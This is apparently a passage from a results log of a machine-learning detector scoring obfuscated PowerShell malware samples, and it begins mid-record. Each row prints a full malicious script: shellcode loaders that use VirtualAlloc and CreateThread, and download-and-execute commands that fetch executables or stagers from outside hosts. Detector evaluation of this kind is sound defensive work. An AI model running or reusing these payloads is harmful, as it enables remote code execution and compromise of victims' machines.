Win32Functio','et([Int','0xd8,0xbe,0x63,0','4,0x59,0x46,0x',',0x11,0xfc,0x3f,0x71,0xcd,0x58,0x34,0x9c,0x1a,0xd1,0x17,0xc9,0xb2,0x8f,0x','e,0xa1,0xed,0x0f,0xb','0;if (Zsrz.Length -gt','9a,0x45','Ptr](ZsrnGVk.ToInt32()+Zsri), Zsrz[Zsri], 1)}','xe6,0xf3,0x5b,0xa0,0x09,0xb3,0xd6,0x96,0x24,0x44,0x4a,0xea,0x27,0xc6,0x91,0x3f,0x87,0xf7,0x59,0x32,0xc6,0x30,0x87,0xb','5,0xd0,0xaf,0xce,0x82,0x96,','a,0x5b,0x9d,0x23,0x60,0xa2,0x11,0','xd6,0x78,0xe3,0x96,0x09,0x0f,0x1d,0xe5,0xb4,0x08,0xda,0x97,0x62,0x9c,0xf8,0x30,0xe0,0x06,0x24,0xc0,0x2','22,0xbe,0xc0,0xdf,0x8e','6,0x09,0x37,0xd4,0xa2,0x59,0xd2,0x37,0xfd,0x3','x31,0x7e,0x17,0x','nt dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(3TYmsvcrt.dll3TY)]public static extern IntPtr mem','lAlloc(0,0x1000,Zsrg,0x40);for (Zsri=0;Zsri ','x21,0','x6','rg = Zsrz.Length};ZsrnGVk=Zsrw::Virt','83,0xee,','e,0x7c,0xd4,','5,0xfd,0x77,0x12,0x82,0xfd,0xa2,0xb7,0x9f,0','ublic static extern IntPtr Create','0x3f,0x33,0xa','x18,0x4e,0x41,0x64,0x98,0x8e,0x29,0x84,0x9','9,0xbb,0x30,0xea,0x2d,0x35,0xd5,0xdb,0x6d,0x21,','IntPtr lpThreadAttr',',0x9c,0xcd,0x00,0xb1,0x74,0x',',0xc5,0xd9,0x74,0x24,0xf4,0x5e,0x33,0xc9,0xb1,0x5a,0',',0xad,0x58,0x6f,0x12,0xad,0x86,0x8f,0xe2,0','f2,0xc6,0x00,0xc4,0x54,','0xfc,0x03,0xc8,0xfe,0x0a,0x30,0xc8,0xe9,0x4',';Zsrw::CreateThread(0,0,Z','ns -passthru;[Byte[]];[Byte[]]Zsrz = 0','0};','8,0xce,','ss, uint dwSize, uint flAllocationType, uint flProtect);[DllImport(3TYkernel32.dll3TY)]p',',0x60,0x57,0x61,0x65,0x5f,0','32.dll3TY)]public static extern IntPtr VirtualAlloc(IntPtr lpAddre','a,0x8c,0xef,0x9e,0','9e,0x68,0xf9,0x3d,0x60,0x1f,0x1','9,0xc3,0x12,0x0a,0x9d,0x9e,0xa','ua','f,0x9a,0xe','-le (Zsrz.Length-1);Zsri++) {Zsrw::mems','a,0x93,0','0xf7,0xd2,0x15,0x7','d,0x7e,0xa','f3,0xc7,0xb3,0x51,0x7f,0xe7,0x6e,0xe4,0xbf,0x62,0x9a,0xa8,0x4a,0x54,0x','09,0x23,0x27,0x72,0x64,0xd','xec,0x34,0x6b,0x3a,0xeb,0x3b,0x46,0x73,0x28,0x90,0x3a,0x27,0x','xf2,0x60,0x15,0x67','srnGVk,0,0,0);for (;;){Start-sleep 6','ad(','x31,0xff,0x93,0x00,0','f,0xbb,0xc5,0x11,0x01,0x54,0x54,0x89,0x5d;Zsrg = 0x100','xfe,0x90,0xe7,0xf0,0x96,0x94,0x15,0x0b,0x43,0x23,0x19,0x80,0xa1,0xa7,0x',' 0x1000){Zs','b6,0xed,0xe8','c,0x98,0x9','x56',',0x02,0x8f,0xaf,0x5e,0x56,0xdc','xda,0xd6,0xbf,0x','d3,0x','0xa9,0xd7,0xf0,0x96,0x0d,0x84,0xe5,0xd8,0x9b,0xb8,0xb6,0x75'))  -CRePLaCe  ([cHAr]72+[cHAr]113+[cHAr]107),[cHAr]39-CRePLaCe([cHAr]51+[cHAr]84+[cHAr]89),[cHAr]34  -RePLACE  ([cHAr]90+[cHAr]115+[cHAr]114),[cHAr]36) | . ( $pshome[21]+$PSHOMe[30]+'X')",malicious,TP
2026-07-13 17:20:36,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\527.ps1,custom-ps-ml,UNKNOWN,f1529a0a-52e7-40e4-b5a8-bb5375585a14,DESKTOP-BAC9DBQ,malicious,0.9721,RandomForest,425,1642.15," &amp;( ([stRiNg]$VeRbosEpreFEReNce)[1,3]+'X'-JOIn'') ( ((\""{1}{13}{9}{20}{14}{12}{6}{21}{0}{25}{7}{24}{18}{19}{10}{5}{16}{17}{22}{11}{23}{2}{8}{15}{3}{4}\""-f'le(ghu','(New-Object','tar','gh','ufleeb.exeghu','/kele.e','ebClient).Do','ttp:/','t-Pr','ystem','om','eeb.exe','t.W',' S','Ne','ocess ','xegh','u,','worldn','it.c','.','wnloadFi','ghufl','ghu);S','/','h')).rEpLacE(([cHAR]103+[cHAR]104+[cHAR]117),[sTrIng][cHAR]39) )",malicious,TP
2026-07-13 17:20:49,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\530.ps1,custom-ps-ml,UNKNOWN,4ed2dac2-1d4d-4b4b-b7f7-065cd6450fb5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,1333,1597.13,"((\""{31}{6}{23}{80}{78}{13}{74}{72}{20}{81}{25}{17}{30}{0}{49}{76}{16}{45}{36}{48}{2}{37}{68}{41}{34}{28}{65}{62}{79}{61}{38}{10}{67}{50}{33}{63}{27}{42}{57}{56}{52}{59}{71}{39}{12}{35}{77}{14}{53}{60}{64}{1}{26}{4}{32}{18}{85}{58}{83}{7}{21}{19}{24}{69}{75}{66}{82}{8}{44}{84}{9}{43}{51}{3}{29}{47}{40}{5}{11}{15}{73}{54}{55}{22}{46}{70}\"" -f 'like Gecko3to;','7a',',','ndex.aspcBE)','4','m','mqWc=NeW-','7mq','/192.1','.43:808','DEfauL','qk[7m','qK=3','EBCLi','23','qi++','ERS','/7.0;','01fc','r[]]7mqb=([','la/5.0 (Windows NT 6.1; ','I=0;[CHa','EX (7mqb-JOiN3to3','O','cHaR[]]','ident','5a743894a0e',' = [','.',')',' rv:11.0) ','7','a8','ROxY;7mqwc.ProxY.CREdeNTIA','wc','to','toUse','7mqu);7',']::','s;7m','J2%{7mq_-BXOR7','q','S','0/','68.','.Add(3','to',')B','r-Agent3to','7mqWc.HEA','EBP','i','C','2f','7mqK.LenGt','h]};I','aL','yStEM.Net.CREDeNti','3t','AchE]','2','EQuEst',' = [SysTEm','ls','97a5','ProxY','cBE','TW','m','(7mqWC.DoWnL',')','::DEFaulTNEtWorkCREDentiAL','7mqu=3toMozil','%','EnT;','OadSTRINg(','d','21','M.NET.W','.NeT.WEBR','bJEct SysTe','WOW64; Tr','http:/','o;','13','3')).RePlAce(([ChAr]51+[ChAr]116+[ChAr]111),[StRing][ChAr]39).RePlAce(([ChAr]66+[ChAr]74+[ChAr]50),[StRing][ChAr]124).RePlAce('7mq',[StRing][ChAr]36).RePlAce(([ChAr]99+[ChAr]66+[ChAr]69),[StRing][ChAr]34)| .( $SHElLid[1]+$shELlid[13]+'X')",malicious,TP
2026-07-13 17:20:53,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\537.ps1,custom-ps-ml,UNKNOWN,b53362e9-d717-4448-a17c-62be5a9866b1,DESKTOP-BAC9DBQ,malicious,0.9998,RandomForest,476,1509.16," ((\""{21}{4}{2}{14}{13}{31}{20}{15}{8}{3}{28}{29}{7}{26}{0}{30}{5}{33}{1}{19}{32}{25}{18}{27}{17}{12}{11}{10}{16}{9}{22}{23}{6}{24}\""-f'et/','d','ect Syst','e(A','bj','0.ex','A','t','l',' AYdf','rt-P','a','t','t','em.Ne','oadFi','rocess','eAYd);S','e','fl','ient).Downl','(New-O','leeble.','exe','Yd','eble.','a.hu/g','x','Ydhttp://ddl2.','da','0/9589621/k00','.WebCl','e','eAYd,AY')).rePLACe(([ChaR]65+[ChaR]89+[ChaR]100),[StrING][ChaR]39) |&amp;( $PsHOME[4]+$pshOme[30]+'X')",malicious,TP
2026-07-13 17:21:06,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\561.ps1,custom-ps-ml,UNKNOWN,98216dfb-ccb1-4940-a3a7-bd5727d4b8c5,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,3077,1534.36,"(((\""{2}{66}{55}{39}{23}{17}{56}{68}{34}{70}{53}{40}{35}{59}{43}{9}{72}{3}{1}{29}{65}{46}{36}{48}{26}{24}{30}{18}{50}{4}{10}{5}{45}{58}{21}{54}{14}{64}{33}{62}{22}{47}{71}{11}{12}{8}{63}{57}{7}{25}{61}{31}{51}{28}{16}{49}{42}{37}{60}{15}{52}{19}{67}{41}{69}{6}{38}{20}{44}{32}{13}{0}{27}\"" -f';N3Lw::CreateThread(0,0,N3Lh1M','d);[DllImport(UQKmsvcrt.dllUQK)]public static extern ','N3LCgD = HZq[DllI','I','xe5,0x4c,0x77,0x75,0x4e,0xfa,0xa1,0xb8,0x4f,0x57','0xea,0x64,0x1b,0',',0xfd','99,0x6e,0x39,0x9f,0xb3,0xb4,0x6d,0xcf,0xab,0x1d,0x0e,0x84,0x2b,0xa2,0xdb,0x31,0x29,0x34,0x24,',',0xa1,0x19,0x5a,0xe5,0x04,0x25,0xbc,0x46,0xf8,0x83,0xb6,0x6a,0x','n',',0x91,0xdb,0xd3,0xaa,0xc6,0x3b,','0x5f,0xaf,0xd8,0xe8,0x14,0xa3,0x95,0x7f,0x72,0xa7,0x28,0x53,0x08,0xd3,0xa1,0x52,0xdf,0x52,0xf1,0x70',',0xfb,0x3f',' (N3Lz.Length-1);N3Li++) {N3Lw::memset([IntPtr](N3Lh1Mn.ToInt32()+N3Li), N3Lz[N3Li], 1)}','cf,0x5e,0xa2,0x1f,0xcf,0x61,0x67','d,0x3c,0xc1,0x00,0x72,0xd0,0xc1,0xd0,0x24,0xba,0x','xe3,0x26,0x66,0x41,0x9d,0x62,0xfc,0xf0,0x62,0xb9,0x78,0x32,0xe8,0x4e,0x7c,0xfc,0x19,0x3a,0x6e,0x68,0xea,0x71,0','irtual','d,0x92,0xa2,0xe1,0x02,0x1a,0x47,0xd0,0x02,0x78,0x03,0x42,0xb3,0x0a,0','9','{N3Lg = N3Lz.Length};N3Lh1M','xde,0xc8,0xa9,0x45,0','0f,0x1a','ntPtr V','83,0xc0,0xf1,0x1f,0','0x6d,0x30,0xd6,0xcc',',0x58,0x13,0x','n,0,0,0);for (;;){Start-sleep 60};',',0xd5,0','IntPtr memset(IntPtr dest, uint src, uint count);HZq;N3','x69,0x59,0x11,0x5','xaa,0x49,0x77,0xe9,0x0a,0x3a,0x1','r (N3Li=0;N3Li -le','x14,0x46,0x7a,0x64,0x11,0x10,0xf1,','nt dwS',')]public static exte','c6,0xd9,0x74,0x24,0xf4,0x58,0x31,0xc9,0xb1,0x47,0x','x1b,0x56,0x0b,0xdd,0x83,0',',0x49,0xaa,0xbe,0x28,0xb7,0xd8,0xae,0xe8;N3Lg = 0x1000;if (N3Lz.Length -gt 0x1000)','c static extern I','pe, uint flProtect);[DllImport(UQKkernel32.dllUQK','0xd','f,0x7b,0xbe,0x63,0x54,0x2a,0xe9,0',' lpStartAddress, IntPtr lpParameter, uint dwCreatio','n=N3Lw::VirtualAlloc(0,0x1000,N3Lg,0x40);fo','x3d,0x2b,0x98,0xd6,0x6f,0xe4,0xd6,0x45,0x80,0x81,0xa3,0x55,0x2b,',',0xa5,0xd9,0x',',0x00,0xfd,0x51,0x5a,0xa6,0x1e,0x24,0x92,0xd5,0xa3,0x3f,','31,0x58,0x13,0x03','xcc,0x3e,0xf5,0xa','x41,0x6e,0x38,0x5e,0x72,0','f,0xe3,0x84,0x65,0x3f,0x0c,0x4f,0x0e','c1,0xb8,0x','e, uint flAllocationTy','x','Kkernel32.dllUQK)]publi','Alloc(IntPtr lpAd','0x26,0xf2,0x4c,0x83,0x55,0xc0,0xd3,0x3f,0xf2,0x68,0x9b,0x99,0x05,0x8f,0xb6,0x5e,0x','0xd9,0x22,0','rn IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr','xa9,0x7e,0x56,0x0',',0x6c,0x33,0xc7,0x50,0xf8,0xd5,0xb7,0x38,0','0x5e,0xed,0xa3,0xd3,0xaf,0x0e,0x','ed,0xb9,0x94,0xe2,0xc2,0xf3,',',0','Lw = Add-Type -memberDefinition N3LCgD -Name UQKWin32UQK -namespace Win32Functions -passthru;[Byte[]];[Byte[]]N3Lz = 0xbb,0xf5,0xfd,0x9c','mport(UQ','0,0x9e,0x91,0xdd,','dress, ui','e,0x0a,0x86,0x4e,0x4b,0xb5,0xff,0x23,0xdc,0xdd,0xfd,0x1a,0x2a,0x42','iz','0x61,0xa4,0x7f,0xb5,0x72,0x0e,0x0b,0x6d,','Flags, IntPtr lpThread'))-rEPLACE([chaR]72+[chaR]90+[chaR]113),[chaR]39  -rEPLACE([chaR]78+[chaR]51+[chaR]76),[chaR]36-rEPLACE 'UQK',[chaR]34)|. ( ([sTRInG]$verbOsePrEFerEnce)[1,3]+'x'-JOiN'')",malicious,TP
2026-07-13 17:21:20,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\569.ps1,custom-ps-ml,UNKNOWN,4e494c47-5c30-4ea6-a612-ec67e86dfe9f,DESKTOP-BAC9DBQ,malicious,0.999,RandomForest,3488,1779.27,". ( $sHELlid[1]+$shELliD[13]+'X')((((\""{39}{14}{35}{19}{5}{9}{22}{52}{48}{1}{42}{0}{34}{24}{51}{44}{15}{27}{7}{41}{49}{55}{47}{26}{21}{30}{32}{16}{25}{18}{43}{54}{12}{37}{10}{6}{53}{2}{50}{40}{38}{36}{11}{17}{23}{28}{13}{56}{8}{46}{45}{57}{20}{33}{3}{31}{4}{29}\""-f'00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64','Ty','0x83,0xf8,0x00,0x7d,0x22,0x58,0x68,0x0','ow643LuWind','wershell6Uc;wBgcmd = 6Uc-nop -noni -enc','t',',0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0','x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0',';wBgi -le (wBgz.Length-1);wBgi++) {','tributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParam','4,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0x36,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10','0c,0x24,0xe9,0x71,0xff','08,0x75,0xec,0xe8,0x61,0x00,0x','Length -gt 0x1000){wBgg = wBgz.Length};wBgx=wBgw::VirtualAlloc(0,0x1','wBgc = h8jh8j[DllImport(6Uckernel32.dll6Uc)]public static extern IntPtr VirtualAlloc(','xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6',',0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe',',0xff,0xff,0x01,0xc3,0x29,0xc6,0x','7,0x6a,0x10,0x','llocationType, uint flProtect);[DllImport(6Uckernel32.dll6Uc)]public static extern IntPtr CreateThread(IntPtr lpThreadA','In','0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x2','eter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(6Ucmsvcrt.dll6Uc)]public static ex','75,0xc7,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;wBgg = 0x100',',0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0','0,0xff,0xd5,0x9','0x68,0x33,0x32,0x00,0x00,',',0x03,0x7d,0xf8,0x3b,0','0;if (wBgz.',' 6Uc;iex 6Uc&amp; wBgx86 wBgcmd wBge6Uc}else{wBgcmd = 6Uc-nop -noni -enc6Uc;iex 6Uc&amp; powershell wBgcmd wBge6Uc;}','9,0xc4,0x5','owsPowerShell3Luv1.03Lupo','4,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x05,0x68,0x0a,0x00,0x00,0x24,0x68,0x02,0x00,0x02,0x9a,0x89,0xe6,0x50,0x50,0x50,0x50','tPtr]::Size -eq 8){wBgx86 = wBgenv:SystemRoot + 6Uc3Lusysw',',0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14','IntPtr lpAddress, uint dwSize, uint flA','5e,0xff,0x','00,0x00,0x6a,0x00,0x6a,0x0','x4d,0x61,0xff,0xd5,0x5e,0x','wBg1 = h8j',',0','x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f','pe -memberDefinition wBgc -Name 6UcWin326Uc -namespace Win32Functions -passthru;[Byte[]];[Byte[]]wBgz = 0xfc,0xe8,0x82,0x00,0x','56,0x57,0x68,','x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0','()+wBgi), wBgz[wBgi], 1)};wBgw::CreateThread(0,0,wBgx,0,0,0)','wBgw::memset([IntPtr](wBgx.ToInt32','0x12,0xeb,0x8d,0x5d,','uint count);h8jh8j;wBgw = Add-',',0x5f,0x5a,0x8b','0,0x40,0x00,0x00,0x6a,0x00,0x50,0x68,0x0b,0x2f,0x0f,0x30,0xff,0xd5,0x57,0x68,0x75,0x6e','xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0','tern IntPtr memset(IntPtr dest, uint src, ','xd9,0xc8,0x5f,0xff,0xd5,','0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x',',','000,wBgg,0x40);for (wBgi=0',';for (;;){Start-sleep 60};h8j;wBge = [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes(wBg1));if(['))-cREPlacE  ([chAR]54+[chAR]85+[chAR]99),[chAR]34  -rEplAcE 'h8j',[chAR]39  -rEplAcE ([chAR]119+[chAR]66+[chAR]103),[chAR]36  -rEplAcE  ([chAR]51+[chAR]76+[chAR]117),[chAR]92))",malicious,TP
2026-07-13 17:21:31,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\593.ps1,custom-ps-ml,UNKNOWN,ed18179f-806d-4c17-919c-b6c26d326488,DESKTOP-BAC9DBQ,malicious,1.0,RandomForest,2810,1743.59,".( $EnV:COMspEc[4,24,25]-jOin'') ( (((\""{14}{12}{31}{19}{11}{0}{25}{22}{9}{24}{10}{38}{33}{6}{23}{34}{28}{1}{39}{26}{17}{18}{21}{3}{4}{16}{27}{41}{42}{43}{8}{13}{46}{37}{15}{2}{5}{45}{36}{7}{40}{35}{32}{30}{20}{44}{29}\"" -f'int','0x8b,0x52,0x10,','f,0x4e,0x08,0x75,0xe','01,0xc7,0x38,0xe0,0x75,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x','75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,','c,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6','sTz = 0xfc,0xe8,0x89,0x00,0x00,0x00','3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;qsTg = 0x1000;if (qsTz.Length -gt 0x1000){qsTg = qsTz','90,0x','nFlags, IntPtr lpThreadId);[DllImport(hYlmsvcr',' static extern IntPtr memset(IntPtr dest, uint src, uint count);mkb;qsTw = Add-T','utes, u','ress, uint dwSize, uint flAllocationType, uint flProtect);','01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xf','qsTc = mkb[DllImport(hYlkernel32.dllhYl)]public static extern IntPtr VirtualAlloc(IntPtr lpAdd','0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0c,0xf','0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0','d3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,','0xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,','IntPtr lpThreadAttrib','Tw::me','0x','r lpParameter, uint dwCreatio',',0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0','t.dllhYl)]public',' dwStackSize, IntPtr lpStartAddress, IntPt','x8b,0x42,0x3c,0x01,0xd0,0x8b,0x40,0x78,0x85,0xc0,0x74,0x4a,0x01,0xd0,0x50,0x8b,0x48,0x18,0x8b,0x58,0x20,0x01,0x','x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,','x0d,0x01,0xc7,0xe2,0xf0,0x52,0x57,','ad(0,0,qsTx,0,0,0);for (;;){Start-sleep 60};','e (qsTz.Length-1);qsTi++) {qs','[DllImport(hYlkernel32.dllhYl)]public static extern IntPtr CreateThread(','000,qsTg,0x40);for (qsTi=0;qsTi -l','Byte[]];[Byte[]]q','xcf,0','ngth};qsTx=qsTw::VirtualAlloc(0,0x1','xd9,0xc8,0x5f,0xff,0xd5,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x01,0xc','8,0x34,0x80,0x68,0x02,0x00,0x01,0xbb,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,','ype -memberDefinition qsTc -Name hYlWin32hYl -namespace Win32Functions -passthru;[','0','.Le','0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,','0xeb,0x86,0x5d,0x68,0x33,','0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x','mset([IntPtr](qsTx.ToInt32()+qsTi), qsTz[qsTi], 1)};qsTw::CreateThre','a,0x04,0x56,0x57,0x68,0x02,0','f,0xd5,0x97,0x6a,0x05,0x68,0xc0,0xa')) -CRePlaCe  ([cHAr]109+[cHAr]107+[cHAr]98),[cHAr]39-CRePlaCe ([cHAr]104+[cHAr]89+[cHAr]108),[cHAr]34-rePlaCe([cHAr]113+[cHAr]115+[cHAr]84),[cHAr]36) )",malicious,TP
2026-07-13 17:21:45,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\597.ps1,custom-ps-ml,UNKNOWN,9c3a2fb5-253d-4b25-bbd0-4e10e6daead0,DESKTOP-BAC9DBQ,malicious,0.9653,RandomForest,2924,1609.4," ((\""{42}{23}{10}{44}{32}{9}{52}{57}{35}{66}{8}{41}{31}{7}{37}{43}{6}{38}{56}{17}{14}{67}{65}{12}{1}{27}{20}{69}{34}{48}{26}{19}{30}{53}{3}{62}{54}{47}{58}{24}{29}{25}{22}{15}{4}{0}{64}{16}{18}{59}{63}{13}{45}{55}{28}{33}{60}{2}{68}{36}{61}{51}{21}{11}{50}{39}{40}{5}{46}{49}\"" -f',0x50,0x50,0x40,','00,0x00,0x60,0x89,0xe5,0x31,0xd2,0x64,0x8b,0x52,0','x','5,0xf4,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe2,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x0','0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50','dui), sduz[sdui], 1)};sduw::CreateThread(','o','lags, IntPtr l',' dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint ','ct);[DllImport(n96kerne','loc(IntPtr lpAddress, uint dwSize, uint flAllo','ff,0xd5,0x01,0xc3,0x29,0xc6,0x85,0xf6,0x75,0xec,0xc3;sd','e8,0x89,0x00,0x',',0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0','nt);Ck9;sduw = Ad','0x90,0x01,',',0x68,0xd5,0x3','Ptr dest, uint src, uint cou','9,0x3a,0x49,0x68,0x02,0x00,0x11,0x5c,0x89,0','18,0x8b,0x58,0x20,0x01,0xd3,0xe3,0x3c,0x49,0x8b,0x34,0x8b,0x01,0','c7,0xe2,0xf0,0x52,0x57,0x8b,0x52,0x10,0x8b,0x42,0x3',',0xd9,0xc8,0x5f,0x','26,0x07,0xff,0xd5,0xb8,','blic static extern IntPtr VirtualAl',',0x58,0x5f,0x5a,0x8b,0x12,','5f,0x54,0x68,0x4c,0x77,0x','1,0xd0,0x50,0x8b,0x48,0x','x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0x','x5f,0xf','0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x','xd6,0x31,0xff,0x31,0xc0,0xac,0xc1,0xcf,0x0d,0x','F','te','f,0xd5,0x8b,0x36,0x6a,0x','40,0x78,0x85,0xc0,0x74,0','ntPtr CreateThr','a,0x00,','pThreadId);[DllIm','rt(n96msvc','ntPtr]','(sdux.ToInt32()+s','dwCreation','sduc = Ck9[DllImport(n96kernel32.dlln96)]pu','p','cationType, uint flPro','c,0xff,0x4e,0x08,0','0,0,sd','x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51','x4a,0x0','ux,0,0,0);for (;;){Start-sleep 60};','ug = 0x1000;if (sduz.Length -gt 0x1000){sdug = sduz.Length};sdux=sduw::VirtualAlloc(0,0x1000,sdug,0x40);for (sdui=0;sdui -le (sduz.Length-1);sdui++) {sduw::memset([I','xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02','l32.dlln9','01,0xc7,0x38,0xe0,0x7','d0,0x89,0x44,0','x75,0xec,0x68,0xf0,0xb5,0xa2,0x56,0xff,0xd5,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0','rt.dlln96)]public static extern IntPtr memset(Int','6)]public static extern I',',0xff,0xe0','x','40,0','0x68,0x58,0xa4,0x53,0','4,0x8b,0x01,0x','e6,0x6a,0x10,0x56,0x57,0x68','0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05','me n96Win32n96 -namespace Win32Functions -passthru;[Byte[]];[Byte[]]sduz = 0xfc,0x','ead(IntPtr lpThreadAttributes, uint','d-Type -memberDefinition sduc -Na','68,0x00,0x10,0x00,0x00,0x56,0x6','c,0x01,0xd0,0x8b,0x')).REPLAcE('n96',[stRiNG][CHaR]34).REPLAcE('Ck9',[stRiNG][CHaR]39).REPLAcE('sdu',[stRiNG][CHaR]36) | &amp;((GV '*Mdr*').naME[3,11,2]-JoiN'')",malicious,TP
2026-07-13 17:21:58,C:\\TA\\project-ta\\data_spliting\\test_set_obf\\String_Reordering\\malicious\\598.ps1,custom-ps-ml,UNKNOWN,37a85d2f-c6e6-4997-8f6f-0f4711675a2c,DESKTOP-BAC9DBQ,malicious,0.9938,RandomForest,2983,1624.93,"&amp; ( $sHELlID[1]+$SHElLID[13]+'X') (((\""{3}{63}{19}{39}{14}{37}{41}{28}{67}{9}{15}{51}{49}{42}{65}{38}{10}{64}{21}{18}{11}{36}{23}{0}{4}{20}{12}{1}{59}{55}{57}{52}{60}{66}{43}{30}{33}{69}{8}{7}{6}{54}{5}{29}{47}{68}{22}{17}{53}{27}{34}{58}{16}{61}{46}{26}{24}{62}{44}{2}{56}{31}{25}{35}{50}{48}{40}{45}{32}{13}\"" -f 'd,0',',0x85,0xc0,0x74,0x4a,0x01,0xd0,0x','xe5,0xff,0xd5,0x93','1gzc = tlL[','x01,0xc7,0xe2,0xf0','00,0x00,0x29','0x54,0x68,0x4c,0x77,0x26,0x0','0x5a,0x51,0xff,0xe0,0x58,0x5f,0x5a,0x8b,0x12,0xeb,0x86,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,','0x24,0x24,0x5b,0x5b,0x61,0x59,',' lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport(pTKmsvcrt.dllpTK)]public static extern IntPtr memset','x','a,0x26,0x31,0xff,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x','3c,0x01,0xd0,0x8b,0x40,0x78','0,1gzx,0,0,0);for (;;){Start-sleep 60};','wSize','(IntPtr dest, uint 